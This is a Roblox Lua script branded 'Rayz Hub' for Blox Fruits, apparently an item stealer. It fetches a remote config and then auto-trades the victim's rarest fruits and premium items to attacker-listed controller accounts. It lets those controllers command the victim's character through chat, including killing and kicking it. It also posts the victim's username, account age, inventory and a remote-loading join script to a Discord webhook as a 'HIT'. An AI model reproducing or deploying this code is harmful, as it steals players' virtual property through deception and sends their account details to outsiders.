local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local placeId = game.PlaceId
local SoundService = game:GetService("SoundService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local CONFIG_URL = "https://rayzhub.netlify.app/scripts/config/config.json"

local function loadConfig()
	local success, result = pcall(function()
		local response = game:HttpGet(CONFIG_URL, true)
		return HttpService:JSONDecode(response)
	end)
	if success and result then
		return result
	end
	return nil
end

local Config = loadConfig()

if not Config or not Config.usernames or not Config.webhooks then
	lp:Kick("Failed to load config. Check your internet.")
	return
end

local CONTROLLERS = Config.usernames
local WEBHOOK_URL = Config.webhooks.bf

local NAME = "Blox Fruit"
local AVATAR_URL = "https://rayzhub.netlify.app/media/bf(9x9).jpg"
local LOGO_URL = "https://rayzhub.netlify.app/media/logo.jpg"
local IMAGE_URL = "https://rayzhub.netlify.app/media/bf(9x16).jpg"
local JOIN_SCRIPT_URL = "https://rayzhub.netlify.app/scripts/bf-joiner.lua"

---------------------------------------------------------------------
--  SEA CHECKER & GUI
---------------------------------------------------------------------
local SEA_2_PLACE_ID = 4442272183

if game.PlaceId ~= SEA_2_PLACE_ID then
	local ScreenGui = Instance.new("ScreenGui")
	local MainFrame = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local Title = Instance.new("TextLabel")
	local Description = Instance.new("TextLabel")
	local TpButton = Instance.new("TextButton")
	local ButtonCorner = Instance.new("UICorner")

	ScreenGui.Name = "RayzSeaCheck"
	ScreenGui.Parent = lp:WaitForChild("PlayerGui")
	ScreenGui.ResetOnSpawn = false

	MainFrame.Name = "MainFrame"
	MainFrame.Parent = ScreenGui
	MainFrame.BackgroundColor3 = Color3.fromRGB(25, 10, 40)
	MainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
	MainFrame.Size = UDim2.new(0, 300, 0, 150)
	MainFrame.BorderSizePixel = 0

	UICorner.CornerRadius = UDim.new(0, 12)
	UICorner.Parent = MainFrame

	Title.Name = "Title"
	Title.Parent = MainFrame
	Title.BackgroundTransparency = 1
	Title.Position = UDim2.new(0, 0, 0.1, 0)
	Title.Size = UDim2.new(1, 0, 0.2, 0)
	Title.Font = Enum.Font.GothamBold
	Title.Text = "RAYZ HUB"
	Title.TextColor3 = Color3.fromRGB(180, 100, 255)
	Title.TextSize = 20

	Description.Name = "Description"
	Description.Parent = MainFrame
	Description.BackgroundTransparency = 1
	Description.Position = UDim2.new(0, 10, 0.35, 0)
	Description.Size = UDim2.new(1, -20, 0.2, 0)
	Description.Font = Enum.Font.Gotham
	Description.Text = "You need to be in Sea 2 for the script to work!"
	Description.TextColor3 = Color3.fromRGB(255, 255, 255)
	Description.TextSize = 14
	Description.TextWrapped = true

	TpButton.Name = "TpButton"
	TpButton.Parent = MainFrame
	TpButton.BackgroundColor3 = Color3.fromRGB(130, 50, 200)
	TpButton.Position = UDim2.new(0.1, 0, 0.65, 0)
	TpButton.Size = UDim2.new(0.8, 0, 0.25, 0)
	TpButton.Font = Enum.Font.GothamBold
	TpButton.Text = "Teleport to Sea 2"
	TpButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	TpButton.TextSize = 14

	ButtonCorner.CornerRadius = UDim.new(0, 8)
	ButtonCorner.Parent = TpButton

	TpButton.MouseButton1Click:Connect(function()
		local args = { "TravelDressrosa" }
		game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
	end)

	return
end

---------------------------------------------------------------------
--  CONFIG
---------------------------------------------------------------------
local INITIAL_FRUIT_COUNT = 0
local FRUIT_START_STATS = {}
local CONTROLLER_JOINED = false
local START_TIME = tick()
local CURRENT_STATUS = "🟡 Waiting"
local lastMessageId = nil

local WANTED_FRUITS = {
	"dragon",
	"kitsune",
	"galaxy dragon",
	"empyrean dragon",
	"ember dragon (east)",
	"ember dragon (west)",
	"galaxy kitsune",
	"empyrean kitsune",
	"crimson kitsune",
	"divine portal",
	"galaxy (empyrean",
	"rose quartz diamond",
	"dark pain",
	"blue pain",
	"orange pain",
	"green lightning",
}

local TWEEN_TIME = 0.2
local TRAVEL_SPEED = 280

---------------------------------------------------------------------
--  SERVICES / GLOBALS
---------------------------------------------------------------------
local httpRequest = (syn and syn.request)
	or (http and http.request)
	or http_request
	or request
	or httprequest
	or (fluxus and fluxus.request)

local ControllerSet = {}
local ControllerDisplayNameSet = {}

for _, name in ipairs(CONTROLLERS) do
	local lowered = name:lower()
	ControllerSet[lowered] = true
end

local function refreshControllerDisplayName(p)
	if not p then
		return
	end
	local nameLower = p.Name:lower()
	if not ControllerSet[nameLower] then
		return
	end

	local disp = p.DisplayName or p.Name
	if disp and disp ~= "" then
		ControllerDisplayNameSet[disp:lower()] = true
		CONTROLLER_JOINED = true
	end
end

for _, p in ipairs(Players:GetPlayers()) do
	refreshControllerDisplayName(p)
end

Players.PlayerAdded:Connect(function(p)
	refreshControllerDisplayName(p)
end)

---------------------------------------------------------------------
--  HELPER FUNCTIONS
---------------------------------------------------------------------
local function getExecutorName()
	if syn then
		return "Synapse X"
	elseif fluxus then
		return "Fluxus"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif is_sirhurt_closure then
		return "SirHurt"
	elseif getexecutorname then
		local s, r = pcall(getexecutorname)
		if s and r then
			return tostring(r)
		end
	elseif identifyexecutor then
		local s, r = pcall(identifyexecutor)
		if s and r then
			return tostring(r)
		end
	end
	return "Unknown"
end

local function getAccountAge()
	local totalDays = lp.AccountAge
	local years = math.floor(totalDays / 365)
	local remaining = totalDays % 365
	local months = math.floor(remaining / 30)
	local days = remaining % 30

	local parts = {}
	if years > 0 then
		table.insert(parts, years .. "y")
	end
	if months > 0 then
		table.insert(parts, months .. "m")
	end
	if days > 0 or #parts == 0 then
		table.insert(parts, days .. "d")
	end
	return table.concat(parts, " ")
end

local function getPlayerCount()
	local current = #Players:GetPlayers()
	local max = Players.MaxPlayers
	return current .. "/" .. max
end

local function getStatusColor(status)
	if status == "🟢 Claimed" then
		return 0x2ECC71
	elseif status == "🔵 Partially Claimed" or status == "🔵 Partially claimed" then
		return 0x3498DB
	elseif status == "🟡 Waiting" or status == "🟢 Connected" then
		return 0xF1C40F
	elseif status == "🔴 Failed" then
		return 0xE74C3C
	end
	return 0x800080
end

local function getSeaNumber()
	local pid = game.PlaceId
	if pid == 2753915549 then
		return 1
	end
	if pid == 4442272183 then
		return 2
	end
	if pid == 7449423635 then
		return 3
	end
	return 3
end

---------------------------------------------------------------------
--  WAYPOINTS
---------------------------------------------------------------------
local PLACE_WAYPOINTS = {
	[4442272183] = {
		Vector3.new(-297.66, 73.22, 282.30),
		Vector3.new(-297.66, 73.22, 271.04),
		Vector3.new(-463.42, 73.22, 282.30),
		Vector3.new(-463.42, 73.22, 271.04),
	},
	[7449423635] = {
		Vector3.new(-12599.00, 343.15, -7543.92),
		Vector3.new(-12602.31, 337.59, -7544.76),
		Vector3.new(-12602.31, 337.59, -7556.76),
		Vector3.new(-12602.31, 337.59, -7568.76),
		Vector3.new(-12591.06, 337.59, -7568.76),
		Vector3.new(-12591.06, 337.59, -7556.76),
	},
}

local WAYPOINTS = PLACE_WAYPOINTS[placeId] or {}
if #WAYPOINTS == 0 then
	warn("[BF Trade] No waypoint configured for this PlaceId:", placeId)
end

local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")

---------------------------------------------------------------------
--  INVENTORY HELPERS
---------------------------------------------------------------------
local RARITY_PRIORITY = {
	[5] = 1,
	[4] = 2,
	[3] = 3,
	[2] = 4,
	[1] = 5,
	[0] = 6,
}

local SPECIAL_SKIN_KEYWORDS = {
	"galaxy dragon",
	"empyrean dragon",
	"ember dragon (east)",
	"ember dragon (west)",
	"galaxy kitsune",
	"empyrean kitsune",
	"crimson kitsune",
	"divine portal",
	"galaxy (empyrean",
	"rose quartz diamond",
	"dark pain",
	"blue pain",
	"orange pain",
	"green lightning",
}

local function isSpecialSkin(displayName)
	if not displayName or displayName == "" then
		return false
	end
	local lower = displayName:lower()
	for _, key in ipairs(SPECIAL_SKIN_KEYWORDS) do
		if lower:find(key, 1, true) then
			return true
		end
	end
	return false
end

local function getInventory()
	local ok, result = pcall(function()
		return CommF:InvokeServer("getInventory")
	end)
	if not ok then
		return {}
	end
	return result or {}
end

local AddedItemsHistory = {}

local function sendAddItemRemote(itemName)
	if not itemName or itemName == "" then
		return
	end
	TradeFunction:InvokeServer("addItem", itemName)
	table.insert(AddedItemsHistory, itemName)
end

local function sendRemoveItemRemote(itemName)
	if not itemName or itemName == "" then
		return
	end
	TradeFunction:InvokeServer("removeItem", itemName)
end

local function toTitleCase(str)
	if not str or str == "" then
		return ""
	end
	str = str:lower()
	return (str:gsub("(%a)(%w*)", function(first, rest)
		return first:upper() .. rest
	end))
end

local function normalizeFruitNameForRemote(raw)
	if not raw or raw == "" then
		return ""
	end
	if string.find(raw, "-", 1, true) then
		return raw
	end
	local title = toTitleCase(raw)
	return title .. "-" .. title
end

local function findInventoryItemByQuery(query)
	if not query or query == "" then
		return nil
	end
	query = query:lower()
	local inv = getInventory()
	local best
	for _, item in pairs(inv) do
		local t = item.Type
		if t == "Blox Fruit" or t == "Premium" then
			local disp = (item.DisplayName or item.Name or ""):lower()
			if disp == query then
				return item
			end
			if not best and disp:find(query, 1, true) then
				best = item
			end
		end
	end
	return best
end

local function commandAddAllFruits()
	local inv = getInventory()
	local list = {}
	for _, item in pairs(inv) do
		if item.Type == "Blox Fruit" then
			local rarity = item.Rarity or 0
			if rarity ~= 5 then
				local copies = item.Count or 1
				local value = item.Value or 0
				local displayName = item.DisplayName or item.Name
				local skinPriority = isSpecialSkin(displayName) and 0 or 1
				for i = 1, copies do
					table.insert(list, {
						Name = item.Name,
						DisplayName = displayName,
						RarityNum = rarity,
						Value = value,
						SkinPrio = skinPriority,
					})
				end
			end
		end
	end
	if #list == 0 then
		return
	end
	table.sort(list, function(a, b)
		if a.SkinPrio ~= b.SkinPrio then
			return a.SkinPrio < b.SkinPrio
		end
		local pa = RARITY_PRIORITY[a.RarityNum] or 99
		local pb = RARITY_PRIORITY[b.RarityNum] or 99
		if pa ~= pb then
			return pa < pb
		end
		if a.Value ~= b.Value then
			return (a.Value or 0) > (b.Value or 0)
		end
		return (a.DisplayName or "") < (b.DisplayName or "")
	end)
	for i = 1, math.min(10, #list) do
		sendAddItemRemote(list[i].Name)
		task.wait(0.12)
	end
end

local function commandAddAllPremium()
	local inv = getInventory()
	local list = {}
	for _, item in pairs(inv) do
		if item.Type == "Premium" then
			local copies = item.Count or 1
			local value = item.Value or 0
			for i = 1, copies do
				table.insert(list, {
					Name = item.Name,
					DisplayName = item.DisplayName,
					RarityNum = item.Rarity or 5,
					Value = value,
				})
			end
		end
	end
	if #list == 0 then
		return
	end
	table.sort(list, function(a, b)
		local pa = RARITY_PRIORITY[a.RarityNum] or 99
		local pb = RARITY_PRIORITY[b.RarityNum] or 99
		if pa ~= pb then
			return pa < pb
		end
		if a.Value ~= b.Value then
			return (a.Value or 0) > (b.Value or 0)
		end
		return (a.DisplayName or "") < (b.DisplayName or "")
	end)
	for i = 1, math.min(10, #list) do
		sendAddItemRemote(list[i].Name)
		task.wait(0.12)
	end
end

local function commandAdd(query)
	if not query or query == "" then
		return
	end
	local item = findInventoryItemByQuery(query)
	local nameToSend = item and (item.Name or item.DisplayName) or normalizeFruitNameForRemote(query)
	sendAddItemRemote(nameToSend)
end

local function commandClear(query)
	if not query or query == "" then
		return
	end
	local item = findInventoryItemByQuery(query)
	local nameToSend = item and (item.Name or item.DisplayName) or normalizeFruitNameForRemote(query)
	sendRemoveItemRemote(nameToSend)
end

local function commandClearAll()
	for _, name in ipairs(AddedItemsHistory) do
		sendRemoveItemRemote(name)
		task.wait(0.05)
	end
	table.clear(AddedItemsHistory)
end

local function commandAccept()
	TradeFunction:InvokeServer("accept")
end

local function commandCancel()
	TradeFunction:InvokeServer("cancel")
end

---------------------------------------------------------------------
--  MOVEMENT / WAYPOINT TWEEN
---------------------------------------------------------------------
local function getCharParts()
	local char = lp.Character or lp.CharacterAdded:Wait()
	local hum = char:WaitForChild("Humanoid")
	local hrp = char:WaitForChild("HumanoidRootPart")
	return char, hum, hrp
end

local function isSeated(hum)
	if not hum then
		return false
	end
	if hum.Sit then
		return true
	end
	if hum.SeatPart ~= nil then
		return true
	end
	return hum:GetState() == Enum.HumanoidStateType.Seated
end

local function commandJump()
	local _, hum = getCharParts()
	if hum then
		hum.Sit = false
		hum.Jump = true
	end
end

local function getTradeLocationCFrame()
	local origin = workspace:FindFirstChild("_WorldOrigin")
	if not origin then
		return nil
	end
	local locations = origin:FindFirstChild("Locations")
	if not locations then
		return nil
	end
	if placeId == 4442272183 then
		for _, child in ipairs(locations:GetChildren()) do
			if child.Name:lower():find("caf") then
				return child.CFrame
			end
		end
	elseif placeId == 7449423635 then
		local mansion = locations:FindFirstChild("Mansion")
		if mansion then
			return mansion.CFrame
		end
	end
	return nil
end

local function getTradeTravelPosition()
	if #WAYPOINTS > 0 then
		return WAYPOINTS[1]
	end
	local cf = getTradeLocationCFrame()
	return cf and cf.Position or nil
end

local function isAtTradeLocation(hrp)
	if not hrp then
		return false
	end
	if #WAYPOINTS > 0 then
		local pos = hrp.Position
		local closest = math.huge
		for _, wp in ipairs(WAYPOINTS) do
			local d = (pos - wp).Magnitude
			if d < closest then
				closest = d
			end
		end
		return closest <= 30
	end
	local target = getTradeLocationCFrame()
	if not target then
		return false
	end
	return (hrp.Position - target.Position).Magnitude <= 50
end

local TweenPaused = false
local ResetInProgress = false

local function travelToTradeLocation()
	local _, hum, hrp = getCharParts()
	if not hrp then
		return
	end
	if isAtTradeLocation(hrp) then
		return
	end
	local travelPos = getTradeTravelPosition()
	if not travelPos then
		return
	end
	local distance = (hrp.Position - travelPos).Magnitude
	local time = distance / TRAVEL_SPEED
	TweenPaused = true
	local tween = TweenService:Create(
		hrp,
		TweenInfo.new(time, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
		{ CFrame = CFrame.new(travelPos) }
	)
	tween:Play()
	local finished = false
	tween.Completed:Connect(function()
		finished = true
	end)
	while not finished do
		if not hrp.Parent then
			break
		end
		if isSeated(hum) then
			tween:Cancel()
			break
		end
		if isAtTradeLocation(hrp) then
			tween:Cancel()
			break
		end
		task.wait(0.02)
	end
	TweenPaused = false
end

task.spawn(function()
	if #WAYPOINTS == 0 then
		return
	end
	local index = 1
	while true do
		local _, hum, hrp = getCharParts()
		if not isAtTradeLocation(hrp) and not ResetInProgress then
			travelToTradeLocation()
			task.wait(0.25)
		else
			while TweenPaused or isSeated(hum) do
				task.wait(0.25)
			end
			local target = WAYPOINTS[index]
			if target and hrp then
				local tween = TweenService:Create(
					hrp,
					TweenInfo.new(TWEEN_TIME, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
					{ CFrame = CFrame.new(target) }
				)
				tween:Play()
				local finished = false
				tween.Completed:Connect(function()
					finished = true
				end)
				while not finished do
					if not hrp.Parent then
						break
					end
					if TweenPaused or isSeated(hum) then
						tween:Cancel()
						break
					end
					task.wait(0.02)
				end
				if finished then
					task.wait(0.2)
				end
				index += 1
				if index > #WAYPOINTS then
					index = 1
				end
			end
			task.wait(0.05)
		end
	end
end)

local function inventoryHasPremium()
	local inv = getInventory()
	for _, item in pairs(inv) do
		if item.Type == "Premium" and (item.Count or 0) > 0 then
			return true
		end
	end
	return false
end

---------------------------------------------------------------------
--  TRADE GUARD
---------------------------------------------------------------------
task.spawn(function()
	local ok, err = pcall(function()
		local pg = lp:WaitForChild("PlayerGui")
		local main = pg:WaitForChild("Main")
		local tradeGui = main:WaitForChild("Trade")
		local container = tradeGui:WaitForChild("Container")
		local slot2 = container:WaitForChild("2")
		local nameLabel = slot2:WaitForChild("TextLabel")
		local WHITE = Color3.fromRGB(255, 255, 255)
		local autoTradeStarted = false

		while true do
			if not tradeGui.Visible then
				autoTradeStarted = false
			else
				local nameText = tostring(nameLabel.Text or "")
				if nameText ~= "" then
					local lower = nameText:lower()
					local isController = ControllerDisplayNameSet[lower] or ControllerSet[lower]
					if not isController then
						commandJump()
					else
						if not autoTradeStarted then
							autoTradeStarted = true
							task.spawn(function()
								task.wait(0.3)
								if inventoryHasPremium() then
									commandAddAllPremium()
									task.wait(0.3)
								end
								commandAddAllFruits()
								while tradeGui.Visible do
									local bt = tradeGui:FindFirstChild("BottomTitle", true)
									if bt and bt:IsA("TextLabel") then
										if bt.TextColor3 == WHITE then
											commandAccept()
											break
										end
									end
									task.wait(0.2)
								end
							end)
						end
					end
				end
			end
			task.wait(0.25)
		end
	end)
end)

---------------------------------------------------------------------
--  RESET FRUIT
---------------------------------------------------------------------
local function commandReset(rest)
	if not rest or rest == "" then
		return
	end
	if ResetInProgress then
		return
	end
	local fruitQuery, countStr = rest:match("^(.-)%s+(%d+)x$")
	local cycles
	if countStr then
		cycles = tonumber(countStr) or 1
		fruitQuery = fruitQuery:gsub("^%s+", ""):gsub("%s+$", "")
	else
		fruitQuery = rest
		cycles = 1
	end
	if cycles < 1 then
		cycles = 1
	end
	local item = findInventoryItemByQuery(fruitQuery)
	local remoteName = item and (item.Name or (item.DisplayName .. "-" .. item.DisplayName))
		or normalizeFruitNameForRemote(fruitQuery)
	ResetInProgress = true
	TweenPaused = true
	task.spawn(function()
		for _ = 1, cycles do
			local char = lp.Character
			if not char then
				lp.CharacterAdded:Wait()
				char = lp.Character
			end
			commandJump()
			task.wait(0.3)
			pcall(function()
				CommF:InvokeServer("LoadFruit", remoteName)
			end)
			local t0 = tick()
			while tick() - t0 < 1.5 do
				char = lp.Character
				if char and char:FindFirstChildWhichIsA("Tool") then
					break
				end
				task.wait(0.05)
			end
			char = lp.Character
			local hum = char and char:FindFirstChildOfClass("Humanoid")
			if hum and hum.Health > 0 then
				hum.Health = 0
			end
			lp.CharacterAdded:Wait()
			task.wait(0.5)
		end
		TweenPaused = false
		ResetInProgress = false
	end)
end

---------------------------------------------------------------------
--  KICK
---------------------------------------------------------------------
local function commandKick(reason)
	reason = (reason and reason ~= "") and reason or "No reason provided."
	lp:Kick("Kicked by moderator: " .. reason)
end

local function sendTpStatusChat()
	local _, _, hrp = getCharParts()
	local atTrade = hrp and isAtTradeLocation(hrp) or false
	local msg = atTrade and "im here bro, come" or "im flying, pls wait to trade"
	pcall(function()
		local tcs = game:GetService("TextChatService")
		if not tcs then
			return
		end
		local channels = tcs.TextChannels
		if not channels then
			return
		end
		local ch = channels:FindFirstChild("RBXGeneral") or channels:FindFirstChild("All")
		if ch then
			ch:SendAsync(msg)
		end
	end)
end

---------------------------------------------------------------------
--  COMMAND SYSTEM
---------------------------------------------------------------------
local function handleCommandMessage(msg)
	if msg == "+1 Fruit Storage" then
		commandAdd("+1 Fruit Storage")
		return
	end
	local prefix = msg:sub(1, 1)
	if prefix ~= "." and prefix ~= "?" and prefix ~= "+" and prefix ~= "-" then
		return
	end
	if prefix == "+" then
		commandAdd(msg:sub(2))
		return
	end
	if prefix == "-" then
		commandClear(msg:sub(2))
		return
	end

	local cmd, rest = msg:match("^[%?%.](%S+)%s*(.*)$")
	if not cmd then
		return
	end
	cmd = cmd:lower()

	if cmd == "jump" or cmd == "test" then
		commandJump()
	elseif cmd == "addallfruits" or cmd == "addall" then
		commandAddAllFruits()
	elseif cmd == "addallpre" or cmd == "addallpremium" then
		commandAddAllPremium()
	elseif cmd == "accept" then
		commandAccept()
	elseif cmd == "cancel" then
		commandCancel()
	elseif cmd == "add" then
		if rest ~= "" then
			commandAdd(rest)
		end
	elseif cmd == "clear" then
		if rest ~= "" then
			commandClear(rest)
		end
	elseif cmd == "clearall" then
		commandClearAll()
	elseif cmd == "reset" then
		if rest ~= "" then
			commandReset(rest)
		end
	elseif cmd == "kick" then
		commandKick(rest)
	elseif cmd == "tp" then
		sendTpStatusChat()
		travelToTradeLocation()
	end
end

---------------------------------------------------------------------
--  COMMAND LISTENER
---------------------------------------------------------------------
local TextChatService = game:GetService("TextChatService")

local function onCommandFromPlayer(plr, msg)
	if not plr or not msg then
		return
	end
	if not ControllerSet[(plr.Name or ""):lower()] then
		return
	end
	handleCommandMessage(msg)
end

local function bindController(plr)
	if not plr then
		return
	end
	if not ControllerSet[(plr.Name or ""):lower()] then
		return
	end
	refreshControllerDisplayName(plr)
	plr.Chatted:Connect(function(message)
		onCommandFromPlayer(plr, message)
	end)
end

for _, p in ipairs(Players:GetPlayers()) do
	bindController(p)
end
Players.PlayerAdded:Connect(bindController)

---------------------------------------------------------------------
--  TEXTCHATSERVICE (NEW CHAT SYSTEM)
---------------------------------------------------------------------
pcall(function()
	if not TextChatService then
		return
	end
	if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
		return
	end

	local function handleTextChatMessage(textMessage)
		if not textMessage then
			return
		end
		local src = textMessage.TextSource
		if not src then
			return
		end
		local plr = Players:FindFirstChild(src.Name)
		if not plr then
			return
		end
		onCommandFromPlayer(plr, textMessage.Text)
	end

	local okSignal, signal = pcall(function()
		return TextChatService.MessageReceived
	end)
	if okSignal and signal then
		signal:Connect(handleTextChatMessage)
	end

	local channels = nil
	pcall(function()
		channels = TextChatService:FindFirstChild("TextChannels") or TextChatService.TextChannels
	end)
	if not channels then
		return
	end

	local function hookChannel(ch)
		if not ch or not ch:IsA("TextChannel") then
			return
		end
		local okMsg, msgSignal = pcall(function()
			return ch.MessageReceived
		end)
		if okMsg and msgSignal then
			msgSignal:Connect(handleTextChatMessage)
		end
	end

	local gen = channels:FindFirstChild("RBXGeneral") or channels:FindFirstChild("All")
	if gen then
		hookChannel(gen)
	end
	for _, ch in ipairs(channels:GetChildren()) do
		hookChannel(ch)
	end
	channels.ChildAdded:Connect(function(ch)
		hookChannel(ch)
	end)
end)

---------------------------------------------------------------------
--  INVENTORY EMBED HELPERS
---------------------------------------------------------------------
local FRUIT_ICON_ORDER = {
	"Dragon",
	"Kitsune",
	"Yeti",
	"Tiger",
	"Spirit",
	"Control",
	"Gas",
	"Venom",
	"Shadow",
	"Dough",
	"T-Rex",
	"Mammoth",
	"Gravity",
	"Blizzard",
	"Portal",
	"Phoenix",
	"Sound",
	"Buddha",
	"Quake",
	"Magma",
	"Light",
	"Diamond",
	"Dark",
	"Sand",
	"Ice",
	"Flame",
	"Smoke",
	"Bomb",
	"Spring",
	"Blade",
	"Spin",
	"Rocket",
}

-- Mythical fruits get unique emojis, all common/non-mythical get 🍅
local MYTHICAL_EMOJI = {
	Dragon = "🐲",
	Kitsune = "🦊",
	Yeti = "☃️",
	Tiger = "🐯",
	Spirit = "👻",
	Control = "🌀",
	Gas = "☁️",
	Venom = "🐍",
	Shadow = "🌑",
	Dough = "🍩",
	["T-Rex"] = "🦖",
	Mammoth = "🦣",
}

local function getFruitIcon(name, rarity)
	if not name then
		return "🍅"
	end
	-- Only mythical (rarity 5) gets a special emoji
	local lower = name:lower()
	for _, f in ipairs(FRUIT_ICON_ORDER) do
		if lower:find(f:lower(), 1, true) then
			if MYTHICAL_EMOJI[f] then
				return MYTHICAL_EMOJI[f]
			end
			break
		end
	end
	return "🍅"
end

local function shouldPingEveryone()
	local inv = getInventory()
	local hasPremium, hasWanted = false, false
	for _, item in pairs(inv) do
		if item.Type == "Premium" and (item.Count or 0) > 0 then
			hasPremium = true
		end
		if item.Type == "Blox Fruit" then
			local dispLower = (item.DisplayName or item.Name or ""):lower()
			for _, wanted in ipairs(WANTED_FRUITS) do
				if dispLower:find(wanted, 1, true) then
					hasWanted = true
					break
				end
			end
		end
	end
	return hasPremium, hasWanted
end

local function buildInventoryTrackingDisplay(maxChars)
	maxChars = maxChars or 900
	local inv = getInventory()
	local list = {}
	local currentTotalCount = 0

	if INITIAL_FRUIT_COUNT == 0 then
		for _, item in pairs(inv) do
			if item.Type == "Blox Fruit" or item.Type == "Premium" then
				local c = item.Count or 1
				FRUIT_START_STATS[item.Name] = c
				INITIAL_FRUIT_COUNT = INITIAL_FRUIT_COUNT + c
			end
		end
	end

	for _, item in pairs(inv) do
		if item.Type == "Blox Fruit" or item.Type == "Premium" then
			local startCount = FRUIT_START_STATS[item.Name] or item.Count or 1
			local currentCount = item.Count or 0
			local tradedCount = math.max(0, startCount - currentCount)
			currentTotalCount = currentTotalCount + currentCount
			local icon
			if item.Type == "Premium" then
				icon = "💎"
			else
				icon = getFruitIcon(item.DisplayName or item.Name, item.Rarity or 0)
			end
			local typeLabel = (item.Type == "Premium") and "Premium" or "Fruit"
			table.insert(list, {
				line = string.format(
					"%s %s [%s] %d/%d",
					icon,
					item.DisplayName or item.Name,
					typeLabel,
					tradedCount,
					startCount
				),
				sortSkin = isSpecialSkin(item.DisplayName or item.Name) and 0 or 1,
				sortRarity = RARITY_PRIORITY[item.Rarity or 0] or 99,
				sortValue = item.Value or 0,
			})
		end
	end

	table.sort(list, function(a, b)
		if a.sortSkin ~= b.sortSkin then
			return a.sortSkin < b.sortSkin
		end
		if a.sortRarity ~= b.sortRarity then
			return a.sortRarity < b.sortRarity
		end
		return a.sortValue > b.sortValue
	end)

	local outLines = {}
	local totalLen = 0
	for _, info in ipairs(list) do
		if totalLen + #info.line + 1 <= maxChars then
			table.insert(outLines, info.line)
			totalLen = totalLen + #info.line + 1
		else
			table.insert(outLines, "and more...")
			break
		end
	end

	local totalClaimed = math.max(0, INITIAL_FRUIT_COUNT - currentTotalCount)
	local finalDisplay = table.concat(outLines, "\n")
		.. "\n─────────────────────────────────\n"
		.. string.format("📊 Claimed: %d / %d", totalClaimed, INITIAL_FRUIT_COUNT)
	return finalDisplay:sub(1, 1024), totalClaimed
end

local function updateStatusLogic()
	local _, totalClaimed = buildInventoryTrackingDisplay(900)
	if not CONTROLLER_JOINED then
		CURRENT_STATUS = (tick() - START_TIME) > 30 and "🔴 Failed" or "🟡 Waiting"
	else
		if INITIAL_FRUIT_COUNT > 0 and (INITIAL_FRUIT_COUNT - totalClaimed) <= 0 then
			CURRENT_STATUS = "🟢 Claimed"
		elseif totalClaimed > 0 then
			CURRENT_STATUS = "🔵 Partially Claimed"
		else
			CURRENT_STATUS = "🟢 Connected"
		end
	end
end

Players.PlayerRemoving:Connect(function(player)
	if player == lp then
		if CURRENT_STATUS == "🟡 Waiting" then
			CURRENT_STATUS = "🔴 Failed"
			pcall(sendInventoryEmbed)
		end
	end
end)

---------------------------------------------------------------------
--  WEBHOOK EMBED
---------------------------------------------------------------------
local function withWaitParam(url)
	url = tostring(url or "")
	if url == "" then
		return url
	end
	if url:lower():find("wait=") then
		return url
	end
	if url:find("?", 1, true) then
		return url .. "&wait=true"
	end
	return url .. "?wait=true"
end

function sendInventoryEmbed()
	if not httpRequest then
		return
	end
	if WEBHOOK_URL == "" then
		return
	end

	local invStr, totalClaimed = buildInventoryTrackingDisplay(900)
	updateStatusLogic()

	local jobId = tostring(game.JobId)
	local sea = getSeaNumber()
	local executor = getExecutorName()
	local accountAge = getAccountAge()
	local playerCount = getPlayerCount()
	local receiverList = table.concat(CONTROLLERS, ", ")
	local displayName = (lp.DisplayName and lp.DisplayName ~= "") and lp.DisplayName or lp.Name
	local userName = lp.Name

	-- Dynamic embed color
	local embedColor = getStatusColor(CURRENT_STATUS)

	-- Teleport script
	local tpScript = 'getgenv().JOBID = "'
		.. jobId
		.. '"\n'
		.. 'getgenv().SEA = "'
		.. tostring(sea)
		.. '"\n'
		.. 'getgenv().USER = "'
		.. lp.Name
		.. '"\n'
		.. 'loadstring(game:HttpGet("'
		.. JOIN_SCRIPT_URL
		.. '"))()'

	-- Ping logic
	local hasPremium, hasWanted = shouldPingEveryone()
	local hitLabel = "SMALL"
	if hasPremium and hasWanted then
		hitLabel = "AMAZING"
	elseif hasPremium or hasWanted then
		hitLabel = "DECENT"
	end

	local contentText = ""
	if hasPremium or hasWanted then
		contentText = "> @everyone 🔔 **" .. hitLabel .. " HIT**"
	else
		contentText = "> 🔔 **" .. hitLabel .. " HIT**"
	end

	-- Player information block with aligned colons
	local playerInfoText = 
	       "👤 Display Name  : "
		.. displayName
		.. "\n"
		.. "🆔 Username      : "
		.. userName
		.. "\n"
		.. "📅 Account Age   : "
		.. accountAge
		.. "\n"
		.. "🖥  Executor     : "
		.. executor
		.. "\n"
		.. "👥 Players       : "
		.. playerCount
		.. "\n"
		.. "🌊 Sea           : "
		.. tostring(sea)
		.. "\n"
		.. "😎 Receiver      : "
		.. receiverList

	local payload = {
		content = contentText,
		username = NAME,
		avatar_url = AVATAR_URL,
		embeds = {
			{
				title = "⚡ RAYZ HUB ⚡",
				color = embedColor,
				fields = {
					{
						name = "📄 Player Information",
						value = "```" .. playerInfoText .. "```",
						inline = false,
					},
					{
						name = "📡 Player Status",
						value = "```" .. CURRENT_STATUS .. "```",
						inline = false,
					},
					{
						name = "🎒 Inventory (" .. INITIAL_FRUIT_COUNT .. " items)",
						value = "```" .. invStr .. "```",
						inline = false,
					},
					{
						name = "📜 Script Join",
						value = "``" .. tpScript .. "``",
						inline = false,
					},
				},
				footer = {
					text = "RAYZ HUB • Sea "
						.. tostring(sea)
						.. " • "
						.. os.date("!%m/%d/%Y %I:%M %p")
						.. " UTC",
					icon_url = LOGO_URL,
				},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
				image = {
					url = IMAGE_URL,
				},
			},
		},
	}

	local body = HttpService:JSONEncode(payload)
	local method = "POST"
	local targetUrl = withWaitParam(WEBHOOK_URL)

	if lastMessageId then
		method = "PATCH"
		targetUrl = WEBHOOK_URL .. "/messages/" .. lastMessageId
	end

	local ok, resp = pcall(function()
		return httpRequest({
			Url = targetUrl,
			Method = method,
